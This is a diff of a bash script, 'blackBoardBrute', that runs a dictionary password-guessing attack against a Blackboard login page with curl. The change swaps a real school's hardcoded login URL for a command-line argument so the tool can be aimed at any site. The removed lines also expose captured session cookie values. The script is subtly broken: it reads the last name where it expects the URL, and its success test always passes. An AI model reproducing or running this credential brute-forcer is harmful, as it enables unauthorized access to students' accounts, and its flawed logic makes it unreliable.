@@ -1,7 +1,7 @@
 mkdir tmp
 if [ $# -eq 0 ]
   then
-    echo "./blackBoardBrute username lastname dictionary"
+    echo "./blackBoardBrute username lastname dictionary url"
     exit;
 fi
 
@@ -14,10 +14,10 @@ checkPass () {
 	cd tmp
 	postData="'user_id=$1&password=&login=Login&action=login&remote-user=&new_loc=&auth_type=&one_time_token=&encoded_pw=$encoded_pw&encoded_pw_unicode=$encoded_pw_unicode'";
 	eval "curl -i -s -k  -X 'POST' \
-	    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0' -H 'Referer: https://panet.andover.edu/webapps/portal/execute/tabs/tabAction?tab_tab_group_id=_15_1' -H 'Content-Type: application/x-www-form-urlencoded' \
+	    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0' -H 'Referer: $3' -H 'Content-Type: application/x-www-form-urlencoded' \
 	    -b 'cookies_enabled=yes; session_id=9450BF88E4E9148EA6565536D11A8523; s_session_id=82E2CBCA462E8C8167C5AF1DF23D12BA; web_client_cache_guid=a5576d52-58c0-44c1-8b0d-3694685080f9; JSESSIONID=A2AF6AA147CEF6DD6AFEF7E43FB55DF3' \
 	    --data-binary \$$postData \
-	    'https://panet.andover.edu/webapps/login/' > $postResponse.tmp"
+	    '$3' > $postResponse.tmp"
 	session_id=$(cat $postResponse.tmp | grep " session_id" | cut -d";" -f1 | cut -d"=" -f2 | sed '2q;d')
 	s_session_id=$(cat $postResponse.tmp | grep "s_session_id" | cut -d";" -f1 | cut -d"=" -f2 | sed '2q;d')
 	web_client_cache_guid=$(cat $postResponse.tmp | grep "web_client_cache_guid" | cut -d";" -f1 | cut -d"=" -f2 | sed '2q;d')
@@ -25,9 +25,9 @@ checkPass () {
 	getResponse=$(LC_CTYPE=C tr -dc A-Za-z0-9 < /dev/urandom | head -c 32 | xargs)
 	cookies="'cookies_enabled=yes; session_id=$session_id; s_session_id=$s_session_id; web_client_cache_guid=$web_client_cache_guid; JSESSIONID=4CF2EEE3ACDF4DC49C709DF26CDA151E'"
 	eval "curl -X 'GET' \
-	    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0' -H 'Referer: https://panet.andover.edu/webapps/portal/execute/tabs/tabAction?tab_tab_group_id=_15_1' \
+	    -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:42.0) Gecko/20100101 Firefox/42.0' -H 'Referer: $3' \
 	    -b $cookies \
-	    'https://panet.andover.edu/webapps/portal/execute/tabs/tabAction?tab_tab_group_id=_1_1' > $getResponse.tmp"
+	    '$3' > $getResponse.tmp"
 	name=$(cat $getResponse.tmp | awk -F"class=global-top-avatar />" '{print $2;}' | awk -F"<span id=badgeTotal style=\"visibility: hidden\" title=\"\"><span class=h" '{print $1;}' | tr -d '\n')
 	rm $getResponse.tmp
 	cd ../
@@ -42,7 +42,7 @@ echo "Starting..."
 while read p; do
 	echo $p;
 	retVal="none"
-	checkPass $1 $p $2
+	checkPass $1 $p $2 $3
 	echo $p " " $retVal
  	if [ "$retVal"=="true" ]; then
 		echo $p;
